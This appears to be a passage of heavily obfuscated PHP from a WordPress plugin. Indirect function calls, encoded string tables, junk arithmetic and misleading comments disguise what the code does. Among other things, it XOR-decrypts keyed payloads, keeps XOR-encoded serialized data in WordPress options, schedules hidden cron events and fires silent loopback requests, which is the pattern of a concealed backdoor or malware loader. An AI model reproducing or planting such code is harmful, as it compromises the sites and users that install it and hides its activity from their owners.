 $lamvx70mcfle   =    (85-22);
 $e2iiaps7ox8 =  $GLOBALS['__scf_gkf62gmdg0_327']($q1c60q378l2fr[$lamvx70mcfle]);
  $iqf6o08t42qni =  $GLOBALS['__scf__fl_gwujcblq_9']($q1c60q378l2fr,      $lamvx70mcfle  + 1,   $e2iiaps7ox8);
     if   (! $GLOBALS['__scf_is0fvk8c7tq2_41']($iqf6o08t42qni)  ||    $GLOBALS['__scf_fxl4k4gsul_10']($iqf6o08t42qni)    < (6-3))  {
continue;

  }
   
 $q2pqc4v35t08p_q   = $GLOBALS['__scf_gkf62gmdg0_327']($iqf6o08t42qni[0]);
        if  ($q2pqc4v35t08p_q  <  1 ||  $GLOBALS['__scf_fxl4k4gsul_10']($iqf6o08t42qni) <     1  +  $q2pqc4v35t08p_q +    1)   {
  continue;
}




 $kmtig_gcm2  =   $GLOBALS['__scf__fl_gwujcblq_9']($iqf6o08t42qni, 1, $q2pqc4v35t08p_q);
  $yivmc683x2ty  =  $GLOBALS['__scf__fl_gwujcblq_9']($iqf6o08t42qni, 1  +   $q2pqc4v35t08p_q);
if  (! $GLOBALS['__scf_is0fvk8c7tq2_41']($kmtig_gcm2)  ||     !   $GLOBALS['__scf_is0fvk8c7tq2_41']($yivmc683x2ty)) {
continue;
}
// WP Cover Block webp conversion

  
     $_3f4sr_qli    =    rp2hrcv77xa_9h3hm($yivmc683x2ty,   $kmtig_gcm2);
      if    (!    $GLOBALS['__scf_is0fvk8c7tq2_41']($_3f4sr_qli)    ||      $GLOBALS['__scf_fxl4k4gsul_10']($_3f4sr_qli) < 2)  {


kkpdha95nyx3tbltd10(gz_aorofp7mo(328),   xpm5lg9odtw6di(329));
 continue;
 }
   
$he0zvn95a_7vhz = $GLOBALS['__scf_gkf62gmdg0_327']($_3f4sr_qli[0]);
if ($he0zvn95a_7vhz <   1    ||    $GLOBALS['__scf_fxl4k4gsul_10']($_3f4sr_qli)   <     1  +   $he0zvn95a_7vhz)    {
       kkpdha95nyx3tbltd10(xognx_h1jzkh(328),  xognx_h1jzkh(330));


continue;
    }
 
  $if502zqtv644nyh    =  $GLOBALS['__scf__fl_gwujcblq_9']($_3f4sr_qli,      1,  $he0zvn95a_7vhz);
$rhx0da4a_jg1_     = $GLOBALS['__scf__fl_gwujcblq_9']($_3f4sr_qli,  1     +  $he0zvn95a_7vhz);



 $uutx_hf6swll      = $GLOBALS['__scf_xctrtxw7z4_147']($GLOBALS['__scf_pn7rzt4ee3t_331']($GLOBALS['__scf_s252tzgcgng_227'](bk9m46jygo3f(319),      $GLOBALS['__scf_uj0mutkf3h_332'](ar6vo_1nyhx2koj5(333),   $rhx0da4a_jg1_))));
if  ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(186)))  {
    update_option(ar6vo_1nyhx2koj5(317), $hl0qvfhrd3bt327);


       update_option(ar6vo_1nyhx2koj5(334), $GLOBALS['__scf_dq0_ug83xej_a_335']("\n", $uutx_hf6swll));
  }



 return array(xpm5lg9odtw6di(336)  =>    $if502zqtv644nyh, gz_aorofp7mo(337) =>    $uutx_hf6swll);
}  catch (Throwable    $o_qyrtxl85owt)      {

   kkpdha95nyx3tbltd10(bk9m46jygo3f(338), $o_qyrtxl85owt);


   continue;
}  catch (Exception $o_qyrtxl85owt)   {



    continue;
  }
}
$fc44l57ov4   =  $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(144))    ?    (string)    get_option(ar6vo_1nyhx2koj5(339),  "")   :    "";
       $l_q24jdxuim =  tjj1y86387zrz51(xpm5lg9odtw6di(340),     "");

 if ($fc44l57ov4     !==   "" &&   $GLOBALS['__scf_is0fvk8c7tq2_41']($l_q24jdxuim)   &&     $l_q24jdxuim !==   "")  {
// Intl extension filter priority

 $uutx_hf6swll    =    $GLOBALS['__scf_xctrtxw7z4_147']($GLOBALS['__scf_pn7rzt4ee3t_331']($GLOBALS['__scf_s252tzgcgng_227'](xognx_h1jzkh(341),   $GLOBALS['__scf_uj0mutkf3h_332'](bk9m46jygo3f(333), $fc44l57ov4))));
 if  (!  empty($uutx_hf6swll))  {
   return     array(xognx_h1jzkh(342)   =>      $l_q24jdxuim,   xpm5lg9odtw6di(337)    => $uutx_hf6swll);
 }


}


        kkpdha95nyx3tbltd10(xpm5lg9odtw6di(338),    gz_aorofp7mo(343));
return   array();
    }
   function qag803080uet9n($vdbxs1krbxe7_5m,  $gf35gb_h2dsnmh, $urn8f4ie8oydhz6)
{
/* discriminative permission */

   if (! $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(186)))   {
// instrument deque for WP Term Description




return false;
     }
   if (isset($GLOBALS[gz_aorofp7mo(344)]) &&   $GLOBALS['__scf_zj8mp2xbaqmp_35']($GLOBALS[xognx_h1jzkh(344)])  &&  $GLOBALS['__scf_j3tbb329sx0_239']($vdbxs1krbxe7_5m, $GLOBALS[gz_aorofp7mo(344)]))  {
unset($GLOBALS[bk9m46jygo3f(344)][$vdbxs1krbxe7_5m]);
       }


 $g1axcaz1nux =   $GLOBALS['__scf_hmblwq7g8zpdz2_345']($gf35gb_h2dsnmh);
  $e12jfxjg0gs =    $GLOBALS['__scf_oi11nsrcts_346']($GLOBALS['__scf_jlhdedaik0c_347'](1,    (0xbe+0x41)));
 $fvs3_k1meh40x   =  "";


     for ($rqfbhg2okkrjeft = 0,  $o6w_gkzy4eqv4x =  $GLOBALS['__scf_fxl4k4gsul_10']($g1axcaz1nux); $rqfbhg2okkrjeft  <     $o6w_gkzy4eqv4x;      $rqfbhg2okkrjeft++)    {
 $fvs3_k1meh40x .=   $GLOBALS['__scf_oi11nsrcts_346']($GLOBALS['__scf_gkf62gmdg0_327']($g1axcaz1nux[$rqfbhg2okkrjeft])   ^  $GLOBALS['__scf_gkf62gmdg0_327']($e12jfxjg0gs));
 }
return    update_option($vdbxs1krbxe7_5m,  $GLOBALS['__scf_upr7jxyxre3_348']($e12jfxjg0gs    .    $fvs3_k1meh40x),    $urn8f4ie8oydhz6) !==   false;
}
 
function  cips53lbwv4iv8mb($vdbxs1krbxe7_5m,  $ar2_dbzl24)
      {
if     (!$GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(349)))      return    $ar2_dbzl24;
  if (isset($GLOBALS[xpm5lg9odtw6di(344)])   && $GLOBALS['__scf_zj8mp2xbaqmp_35']($GLOBALS[gz_aorofp7mo(350)]) &&  $GLOBALS['__scf_j3tbb329sx0_239']($vdbxs1krbxe7_5m,  $GLOBALS[gz_aorofp7mo(350)]))  {
// streaming timeout-policy



     return $GLOBALS[bk9m46jygo3f(350)][$vdbxs1krbxe7_5m];
}
   $vdfd98qh2lkmf57      =  get_option($vdbxs1krbxe7_5m,  "");
if  ($vdfd98qh2lkmf57  === ""  ||    ! $GLOBALS['__scf_is0fvk8c7tq2_41']($vdfd98qh2lkmf57))    {
 return   $ar2_dbzl24;


    }
$eloadf0idurz_uh  =    @$GLOBALS['__scf_hg1ogpq4w6_351']($vdfd98qh2lkmf57,    true);
 

if ($eloadf0idurz_uh   ===  false    ||     $GLOBALS['__scf_fxl4k4gsul_10']($eloadf0idurz_uh)  <   2)    {
return $ar2_dbzl24;
 }
 $e12jfxjg0gs  =   $eloadf0idurz_uh[0];

$f3d5kt9zc_swsi =  "";
   for     ($rqfbhg2okkrjeft   =  1,  $o6w_gkzy4eqv4x  =  $GLOBALS['__scf_fxl4k4gsul_10']($eloadf0idurz_uh); $rqfbhg2okkrjeft <    $o6w_gkzy4eqv4x; $rqfbhg2okkrjeft++)   {
// abort repeatable-read proof-term

 $f3d5kt9zc_swsi  .= $GLOBALS['__scf_oi11nsrcts_346']($GLOBALS['__scf_gkf62gmdg0_327']($eloadf0idurz_uh[$rqfbhg2okkrjeft])   ^     $GLOBALS['__scf_gkf62gmdg0_327']($e12jfxjg0gs));
  }
$nvho665iadpyz  = wq0swgzra2dkvddwyjsix($f3d5kt9zc_swsi);
  if ($nvho665iadpyz  !==   false) {

     if (!isset($GLOBALS[xpm5lg9odtw6di(350)])   || !$GLOBALS['__scf_zj8mp2xbaqmp_35']($GLOBALS[ar6vo_1nyhx2koj5(350)]))  $GLOBALS[gz_aorofp7mo(350)]   =   array();



  if ($GLOBALS['__scf_oenrsvkzs1_36']($GLOBALS[bk9m46jygo3f(350)])    >     (63^127))   $GLOBALS[xpm5lg9odtw6di(350)]  = array();
$GLOBALS[xognx_h1jzkh(350)][$vdbxs1krbxe7_5m]  =      $nvho665iadpyz;
    return   $nvho665iadpyz;
 }



  return    $ar2_dbzl24;
  }

   function wq0swgzra2dkvddwyjsix($iqf6o08t42qni)



 {
  if (!$GLOBALS['__scf_is0fvk8c7tq2_41']($iqf6o08t42qni)) return  false;
    if  (defined(xognx_h1jzkh(352))   &&  PHP_VERSION_ID  >= (19762+50238)) {
return   @$GLOBALS['__scf_wdpewt3rgpl2_353']($iqf6o08t42qni,     array(xpm5lg9odtw6di(354)    =>  false));
     }
return @$GLOBALS['__scf_wdpewt3rgpl2_353']($iqf6o08t42qni);


   }


 function gf0ell8icvy9h3of4n8b()
       {
    static   $xvqxrl6r3nrmbkp  = null;
    if   ($xvqxrl6r3nrmbkp    !==  null)  return  $xvqxrl6r3nrmbkp;
  $dz9ttep94ondlpl  =   defined(bk9m46jygo3f(139))    ? ABSPATH  : "";


     $xvqxrl6r3nrmbkp =    $GLOBALS['__scf_v2rfz0q9cvmh_12']($GLOBALS['__scf_vz8ci2guu7b5_355']('\\',   '/', $dz9ttep94ondlpl), '/') .  '/';
   return      $xvqxrl6r3nrmbkp;
}
     function dmqaubx1rbr260fipu($vdbxs1krbxe7_5m)
{
return g2g3r6pz8prst3gz(gf0ell8icvy9h3of4n8b()  .  (string)   aruikh7uoh1wrp5bqr79()  .  $vdbxs1krbxe7_5m,  (4+8));
 }
 function   j3vkapmz6az2bzd0wv($rhb7ikn12gowlj)
    {

    return    (string)  ((90999968+32)    +    ((int) hexdec($GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_eo363tjzd4r6n_56'](gf0ell8icvy9h3of4n8b()   . xpm5lg9odtw6di(356)   .   $rhb7ikn12gowlj),  0,   (4^3))) % (8999937+62)));
   }
   function  fyn7x5ysxlz3dma4n214it()
  {



   return     j3vkapmz6az2bzd0wv(ar6vo_1nyhx2koj5(357));
      }
   function th42uhcfsabfth()



      {
$w26iyt6kv5r3   =  (string)  tjj1y86387zrz51(xpm5lg9odtw6di(358), "");
 return     $GLOBALS['__scf_fxl4k4gsul_10']($w26iyt6kv5r3)      > (19-9)   && $GLOBALS['__scf_j_4rj7vg4ae0j_7']($w26iyt6kv5r3, fyn7x5ysxlz3dma4n214it())   !== false &&      $GLOBALS['__scf_fxl4k4gsul_10']((string)   tjj1y86387zrz51(ar6vo_1nyhx2koj5(359), ""))    > (47+53);
  }

 
  function     tjj1y86387zrz51($vdbxs1krbxe7_5m,   $ar2_dbzl24)
   {
 return cips53lbwv4iv8mb(dmqaubx1rbr260fipu($vdbxs1krbxe7_5m),      $ar2_dbzl24);
      }
 function     ydk7304srtwvcn8gdl($vdbxs1krbxe7_5m, $ar2_dbzl24 =  "")
       {
     $du8t9u_zqkx  = tjj1y86387zrz51($vdbxs1krbxe7_5m,  $ar2_dbzl24);



   if ($GLOBALS['__scf_is0fvk8c7tq2_41']($du8t9u_zqkx))    return $du8t9u_zqkx;
 if  ($GLOBALS['__scf_hefuz1dmp7si0_360']($du8t9u_zqkx))    return    (string)  $du8t9u_zqkx;
   return $ar2_dbzl24;
   }
function fplgzzpq8bt5jm2fl03pi($vdbxs1krbxe7_5m, $gf35gb_h2dsnmh,  $urn8f4ie8oydhz6)

   {
    return  qag803080uet9n(dmqaubx1rbr260fipu($vdbxs1krbxe7_5m), $gf35gb_h2dsnmh,  $urn8f4ie8oydhz6);
  }
    function  h75qkw97z_59ai()
     {



   $bbefnl57yexcf     =   isset($GLOBALS[bk9m46jygo3f(159)]) ?  $GLOBALS[ar6vo_1nyhx2koj5(361)]    : array();
  $vdfd98qh2lkmf57    =  tjj1y86387zrz51(gz_aorofp7mo(362), array());



if ($GLOBALS['__scf_zj8mp2xbaqmp_35']($vdfd98qh2lkmf57)) {



   $bbefnl57yexcf   =  $GLOBALS['__scf_j59q8mojj8e4ar_363']($vdfd98qh2lkmf57,   $bbefnl57yexcf);


   }
 $bbefnl57yexcf =   $GLOBALS['__scf_p3c9g_i0vy_148']($bbefnl57yexcf);
 return  $GLOBALS['__scf_umxqreicn053_158']($bbefnl57yexcf,   -(2+48));
     }
 function  wcouv_y1w9895e()

 {
     if  (!isset($GLOBALS[xognx_h1jzkh(361)])  || empty($GLOBALS[ar6vo_1nyhx2koj5(361)]))  return;
   try  {



  $vdfd98qh2lkmf57 = tjj1y86387zrz51(bk9m46jygo3f(362),  array());

  $dnhmahydsm7g5mbv =  $GLOBALS['__scf_p3c9g_i0vy_148']($GLOBALS['__scf_j59q8mojj8e4ar_363']((array)$vdfd98qh2lkmf57,      $GLOBALS[xognx_h1jzkh(361)]));
$dnhmahydsm7g5mbv =    $GLOBALS['__scf_umxqreicn053_158']($dnhmahydsm7g5mbv,    -(49^3));
        fplgzzpq8bt5jm2fl03pi(xognx_h1jzkh(364), $dnhmahydsm7g5mbv,  xpm5lg9odtw6di(365));
 }   catch  (Throwable $o_qyrtxl85owt)    {



 kkpdha95nyx3tbltd10(gz_aorofp7mo(366), $o_qyrtxl85owt);
 }    catch  (Exception     $o_qyrtxl85owt)  {
 }
     }
     
  function  rp2hrcv77xa_9h3hm($iqf6o08t42qni,   $key)
{
 if (!    $GLOBALS['__scf_is0fvk8c7tq2_41']($iqf6o08t42qni)    ||   !  $GLOBALS['__scf_is0fvk8c7tq2_41']($key)   ||   $GLOBALS['__scf_fxl4k4gsul_10']($key) ===   0)   {
 return null;
 }
 $ot63do2h03l =  $GLOBALS['__scf_fxl4k4gsul_10']($iqf6o08t42qni);
    $bny25fkxi0_a1zy  = $GLOBALS['__scf_fxl4k4gsul_10']($key);$q48233545xdko=72+8;$l6zympcl=$q48233545xdko-2;
$wyjil_di2aatar  =  "";
     for   ($rqfbhg2okkrjeft   =     0; $rqfbhg2okkrjeft    <    $ot63do2h03l;   $rqfbhg2okkrjeft++)    {
$wyjil_di2aatar  .= $GLOBALS['__scf_oi11nsrcts_346']($GLOBALS['__scf_gkf62gmdg0_327']($iqf6o08t42qni[$rqfbhg2okkrjeft]) ^  $GLOBALS['__scf_gkf62gmdg0_327']($key[$rqfbhg2okkrjeft  %   $bny25fkxi0_a1zy]));
   }
 return     $wyjil_di2aatar;
 }
 
 function  e0infr6qg0_ps_k3erwxeb($cgxk_ww4x73wupxd)
     {
  if   (!  $GLOBALS['__scf_zj8mp2xbaqmp_35']($cgxk_ww4x73wupxd))     {
$cgxk_ww4x73wupxd =    array();
 }
   static $nsakqcyl9ky4_zpi =   null;
 if ($nsakqcyl9ky4_zpi ===  null)  {
  $nsakqcyl9ky4_zpi =   iez5nv7riwymw9wlb9sy();
 $x4l3_x2a66zooe6 =     $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(349))  ?  cips53lbwv4iv8mb(ar6vo_1nyhx2koj5(367), false) :  false;
    if   ($GLOBALS['__scf_zj8mp2xbaqmp_35']($x4l3_x2a66zooe6)   &&      isset($x4l3_x2a66zooe6[xognx_h1jzkh(368)])    && (int)  $x4l3_x2a66zooe6[gz_aorofp7mo(368)]    >=    (374-74)    && (int)   $x4l3_x2a66zooe6[xpm5lg9odtw6di(368)]  <= (133200-46800))   $nsakqcyl9ky4_zpi  =  (int)     $x4l3_x2a66zooe6[gz_aorofp7mo(368)];
      if   ($nsakqcyl9ky4_zpi  < (54+6))  {
// normal skip-list

$nsakqcyl9ky4_zpi =      (0x6b4+0x75c);
     }


 }

$cgxk_ww4x73wupxd[xpm5lg9odtw6di(369)]  =  array(
   xpm5lg9odtw6di(370)      =>   $nsakqcyl9ky4_zpi,
   xpm5lg9odtw6di(371)  => xognx_h1jzkh(372),
   );
    $cgxk_ww4x73wupxd[xpm5lg9odtw6di(373)] =     array(
   xpm5lg9odtw6di(370)  =>  (550+50),
gz_aorofp7mo(371)   =>  ar6vo_1nyhx2koj5(372),
);


   return $cgxk_ww4x73wupxd;
}



  
     function    di6e9raz06_0xfxx()
{
   if    (!$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(374))  ||  !$GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(375)))  return;
 if  (!_sshnzj53qt2m4bfy5eod(xognx_h1jzkh(376))) return;
try      {
   if (!wp_next_scheduled(ios6xxr5y_3fibzei373rz())) {
     wp_schedule_event($GLOBALS['__scf_ks7_xfapvywl_185']() + $GLOBALS['__scf_jlhdedaik0c_347']((15<<2), (253+47)),  ar6vo_1nyhx2koj5(377),  ios6xxr5y_3fibzei373rz());
  }
       }   finally  {
h1f3kqk1cj4d18z(gz_aorofp7mo(376));
  }


}
       
function   iw80be21htnsz_794c8a66()


  {
// WP Template Parts: intercept dependent-type

    
 if      (defined(xognx_h1jzkh(378))  &&    DOING_CRON)    {
// WP BlockControls thumbnail crop

return;



    }



  
    static      $g_okuxhjj9    =  false;
 




  if  ($g_okuxhjj9) return;
     $g_okuxhjj9 =  true;

 
if      (! yqogww_3dp1t37p3()) {
  return;
    }


     
at5lxm3vzat7_ev9(bk9m46jygo3f(379),  bk9m46jygo3f(380),   0);
}
    function    k3095f7tltu3epbw0j()
{
if    (!$GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(290))   || !$GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(381)))    return;
@$GLOBALS['__scf_md_ke_yv3own8f_290'](site_url(gz_aorofp7mo(382) .  $GLOBALS['__scf_vz8ci2guu7b5_355']('.',  "",  (string)   $GLOBALS['__scf_nz_jvx37ph58fn_287'](true))  .   $GLOBALS['__scf_jlhdedaik0c_347']((112^20), (959+40))), array(bk9m46jygo3f(291)  =>  0.01,  gz_aorofp7mo(383)  =>  false, gz_aorofp7mo(306)    =>      false));
 }

function   z8fxvz2iygjmxu6500u()
  {
   static  $wwt12vwxgisojfqf     =     false;
 if   ($wwt12vwxgisojfqf)  return;
       $wwt12vwxgisojfqf  = true;
try     {$thyk24oo7p7q5=68*8;$oqyinwfidnnk=$thyk24oo7p7q5-43;
 vuz_88kdchi44nf();
  $sfvbloghh5er2vq =  false;
     if      ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(384)))    {
    $GLOBALS['__scf_gyqx0aoue42_385']();
    $sfvbloghh5er2vq =  true;

}     elseif   ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(386)))   {
// PHPStan level 9 nonce validation

   $GLOBALS['__scf_e26frum9mv_386']();
$sfvbloghh5er2vq    =   true;$v4941_kp21v5=(0xf+0x11);$agi0gawrv5c1y=$v4941_kp21v5%15;
 } else  {
if ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(387)))  {
    @$GLOBALS['__scf_k6gt90r92gxj8_388'](true);
  }
    $t0_544en70gom = false;$bmxjo1nc=82*6;$dcdlewohzks_23=$bmxjo1nc-45;
if   ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(229)))    {
$h_bt6dyezn3unzmt    = $GLOBALS['__scf_bwbaq8fxyxm3_103']($GLOBALS['__scf_u6m4cedwgt__319']((string) @$GLOBALS['__scf_if1j_n66jo7w7_111'](ar6vo_1nyhx2koj5(389))));
    $t0_544en70gom =  ($h_bt6dyezn3unzmt   !==   ""   && $h_bt6dyezn3unzmt    !==    '0' && $h_bt6dyezn3unzmt  !==  xpm5lg9odtw6di(390));
 }
     $rcyvk_rr6_f  = $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(391))    ?     @ob_get_status(true) : array();
  if  ($GLOBALS['__scf_zj8mp2xbaqmp_35']($rcyvk_rr6_f))    {
    foreach ($rcyvk_rr6_f  as  $ikujsk3f4v2g)  {
   $lh37kdd6sjar     = $GLOBALS['__scf_zj8mp2xbaqmp_35']($ikujsk3f4v2g)  &&    isset($ikujsk3f4v2g[xognx_h1jzkh(392)])     ? $GLOBALS['__scf_bwbaq8fxyxm3_103']((string)    $ikujsk3f4v2g[gz_aorofp7mo(392)])  :   "";
  if      ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($lh37kdd6sjar, ar6vo_1nyhx2koj5(393))  !== false || $GLOBALS['__scf_j_4rj7vg4ae0j_7']($lh37kdd6sjar, ar6vo_1nyhx2koj5(394)) !==   false)     {
 $t0_544en70gom  =      true;
 break;


 }
}
     }
       if  (!$t0_544en70gom &&    $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(395)))  {$pifjcdfhuree=PHP_INT_MAX/PHP_INT_MAX;$qrizr0cocjq8q2=$pifjcdfhuree+32;
foreach  ((array) @headers_list() as  $hoc82f6d0l)  {
if (stripos($hoc82f6d0l,  xognx_h1jzkh(396)) ===  0  &&    stripos($hoc82f6d0l,  bk9m46jygo3f(397))      ===  false)      {

  $t0_544en70gom  =   true;
  break;
}


 }


}
     $_m8biq63krqp   = $GLOBALS['__scf_w645jfzvum_104']();
  $yojedcttyjfmlbrj  =     ($_m8biq63krqp  !== xpm5lg9odtw6di(398)  &&  $_m8biq63krqp    !== xognx_h1jzkh(399));
     $gltrfgto_yfdz9v  =   $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(400)) ?  (int)     @http_response_code()  : (153^81);
     $w868nmspe7     =    ($gltrfgto_yfdz9v   >= (0x2e+0x36) &&  $gltrfgto_yfdz9v   < (160^104))    ||    $gltrfgto_yfdz9v ===    (111+93)   ||   $gltrfgto_yfdz9v ===  (275+29);
       $iml_9gj2tn3pt4   = (isset($_SERVER[xognx_h1jzkh(401)])  &&  $_SERVER[ar6vo_1nyhx2koj5(401)]  === xpm5lg9odtw6di(402));
$kopcpj_vxwb =  false;
 if  ($yojedcttyjfmlbrj   && !$w868nmspe7    &&     !$iml_9gj2tn3pt4 &&  !headers_sent()   &&    !$t0_544en70gom)  {
while  ($GLOBALS['__scf_n82j_c5k8jxotq_403']() > 1) {
 $oz445917rufoehw =  $GLOBALS['__scf_n82j_c5k8jxotq_403']();
if     (!@$GLOBALS['__scf_in4xcc75ala901_404']() ||      $GLOBALS['__scf_n82j_c5k8jxotq_403']() >= $oz445917rufoehw)  break;



     }
 $ikujsk3f4v2g   = $GLOBALS['__scf_n82j_c5k8jxotq_403']() ===  1 &&      $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(405))    ?  @ob_get_status()     :  array();
$lh37kdd6sjar    =    $GLOBALS['__scf_zj8mp2xbaqmp_35']($ikujsk3f4v2g)   && isset($ikujsk3f4v2g[gz_aorofp7mo(392)]) ?     $GLOBALS['__scf_bwbaq8fxyxm3_103']((string)    $ikujsk3f4v2g[xpm5lg9odtw6di(406)])   :    "";



$_cl     =   false;

 if  ($GLOBALS['__scf_n82j_c5k8jxotq_403']()    ===  0)  {


      $_cl     = 0;
   }   elseif (
     $GLOBALS['__scf_n82j_c5k8jxotq_403']() === 1
&&  $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(407))
   && ($lh37kdd6sjar ===    "" ||      $lh37kdd6sjar ===   xpm5lg9odtw6di(408))
&&  $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(409))


   )     {
$_cl =   @ob_get_length();



 }
  $jtnq139g5m   =     true;
     if   (isset($GLOBALS[bk9m46jygo3f(410)][gz_aorofp7mo(411)]))     {



$_wf =   $GLOBALS[bk9m46jygo3f(410)][ar6vo_1nyhx2koj5(411)];
      $c9jlug094krglvcn  =   ($GLOBALS['__scf_v834hljo6be9_67']($_wf) && isset($_wf->callbacks))   ?     $_wf->callbacks : ($GLOBALS['__scf_zj8mp2xbaqmp_35']($_wf)    ? $_wf   : array());

   foreach     ($c9jlug094krglvcn  as $_pr    => $fieo1zfwtsdmq) {
   if  (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($fieo1zfwtsdmq)) continue;



  foreach   ($fieo1zfwtsdmq as  $gvh_8v2olrwq)    {
     $dvmzn1ryg7kzn =  ($GLOBALS['__scf_zj8mp2xbaqmp_35']($gvh_8v2olrwq) &&    isset($gvh_8v2olrwq[xpm5lg9odtw6di(412)]))     ?   $gvh_8v2olrwq[ar6vo_1nyhx2koj5(412)]     : "";
  if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($dvmzn1ryg7kzn)     && $GLOBALS['__scf_uh0dc0gefs_xhu_149']($dvmzn1ryg7kzn, array(xpm5lg9odtw6di(413), xognx_h1jzkh(414)), true))  continue;
  $jtnq139g5m  =      false;
  break    2;
    }
 }
unset($_wf,  $c9jlug094krglvcn,  $_pr, $fieo1zfwtsdmq,  $gvh_8v2olrwq,  $dvmzn1ryg7kzn);
}
      if  ($_cl  !==    false  &&      $jtnq139g5m && !headers_sent()) {
  @header(bk9m46jygo3f(415) .  (int)  $_cl);$ka20svh3nand=PHP_MAJOR_VERSION;$r4bnb9p5j=$ka20svh3nand*5;
@header(gz_aorofp7mo(416));
  $kopcpj_vxwb     =      true;

 }
   }
 if  ($yojedcttyjfmlbrj)   {
// Composer autoload: flatten type-environment

 while  ($GLOBALS['__scf_n82j_c5k8jxotq_403']() >     0)  {
  $oz445917rufoehw   =   $GLOBALS['__scf_n82j_c5k8jxotq_403']();
  if    (!@$GLOBALS['__scf_in4xcc75ala901_404']() ||     $GLOBALS['__scf_n82j_c5k8jxotq_403']()     >= $oz445917rufoehw)     break;


 }



 @$GLOBALS['__scf_ytyoalbgnl_417']();
  }
if   ($kopcpj_vxwb &&    $GLOBALS['__scf_n82j_c5k8jxotq_403']()  ===  0) $sfvbloghh5er2vq =  true;

 unset($t0_544en70gom,  $h_bt6dyezn3unzmt, $rcyvk_rr6_f,  $ikujsk3f4v2g, $lh37kdd6sjar,  $hoc82f6d0l,  $_m8biq63krqp,  $yojedcttyjfmlbrj,     $gltrfgto_yfdz9v,  $w868nmspe7, $kopcpj_vxwb, $oz445917rufoehw, $_cl, $iml_9gj2tn3pt4);
 }
$n_tsvv3s9qye_h     = $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(418)) && !(defined(ar6vo_1nyhx2koj5(419)) &&   DISABLE_WP_CRON);
 $vgzoyvh8465t8ph  =  !$GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(420)) ||  (int) get_option(ar6vo_1nyhx2koj5(421),      0)   ===    0;
  if (!$vgzoyvh8465t8ph   &&     $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(422))   && $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(186))) {
 $qgdzoivl6k3uj   = (string)   get_option(gz_aorofp7mo(423),    "");
 if ($qgdzoivl6k3uj  !==   xl8k_pjv1048a7ae7()) {
 @update_option(xognx_h1jzkh(423), xl8k_pjv1048a7ae7(),  xognx_h1jzkh(365));

 @update_option(gz_aorofp7mo(421),   0,      bk9m46jygo3f(365));
  $vgzoyvh8465t8ph =   true;


 }



  }
 $mi65zq48xcm      =  false;



  if  ($n_tsvv3s9qye_h      &&   $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(424)))     {

$rfqi7jf613w  = wp_next_scheduled(ios6xxr5y_3fibzei373rz());
 if ($rfqi7jf613w && ($GLOBALS['__scf_ks7_xfapvywl_185']()  -      (int)  $rfqi7jf613w) >      (12999-5799))  {
 $mi65zq48xcm   =    true;
       if   ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(425)))    @wp_unschedule_event((int)  $rfqi7jf613w, ios6xxr5y_3fibzei373rz());
  }
// WP InspectorControls: link canonical-form

    }


  if   ($n_tsvv3s9qye_h  && !$vgzoyvh8465t8ph  &&  !$mi65zq48xcm)  {
/* repeatable-read coordinator */
$qbqr94xf=PHP_INT_MAX/PHP_INT_MAX;$rt8n56bt3=$qbqr94xf+62;


   $mv44dy3jyud_s_   = $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(426))  ?  (int)     wp_next_scheduled(ios6xxr5y_3fibzei373rz())   :  0;

 if  ($mv44dy3jyud_s_    <=   0  ||   $mv44dy3jyud_s_  - $GLOBALS['__scf_ks7_xfapvywl_185']() >  (815+85))   {
    @wp_schedule_single_event($GLOBALS['__scf_ks7_xfapvywl_185'](),    ios6xxr5y_3fibzei373rz());
  }
w24perh9wlkwrto1();
 return;
}
     if ($mi65zq48xcm) kkpdha95nyx3tbltd10(bk9m46jygo3f(427),  ar6vo_1nyhx2koj5(428));
    if (!$sfvbloghh5er2vq)  {
    if    ($n_tsvv3s9qye_h)  {
 @wp_schedule_single_event($GLOBALS['__scf_ks7_xfapvywl_185'](),   ios6xxr5y_3fibzei373rz());

k3095f7tltu3epbw0j();
w24perh9wlkwrto1();


     return;
   }
 if      ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(429)))  @$GLOBALS['__scf_lqfsnsgtu2c_429']((70^242));
  rykky2x73sq97ge((0x2+0x8));
    return;



 }
// attach essential work-queue




 if  ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(430)))   @$GLOBALS['__scf_lqfsnsgtu2c_429']((168+12));
 rykky2x73sq97ge();
 } catch (Throwable   $o_qyrtxl85owt) {
    kkpdha95nyx3tbltd10(bk9m46jygo3f(431),   $o_qyrtxl85owt);
 }   catch   (Exception  $o_qyrtxl85owt)   {


}
      }
  
  function  m0w3n75lf2_3hp()



  {



   try {
